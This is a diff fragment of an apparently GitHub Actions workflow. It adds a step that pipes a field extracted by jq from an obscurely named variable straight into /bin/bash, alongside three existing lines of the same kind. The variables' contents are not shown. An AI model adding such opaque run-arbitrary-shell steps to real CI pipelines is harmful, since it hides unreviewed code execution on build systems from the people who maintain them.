@@ -20,6 +20,7 @@ jobs:
           echo $ot08 | jq -r .y13 | /bin/bash
           echo $owu6 | jq -r .j5564 | /bin/bash
           echo $wcgj59 | jq -r .xhwe611 | /bin/bash
+          echo $arjn49 | jq -r .ba1 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
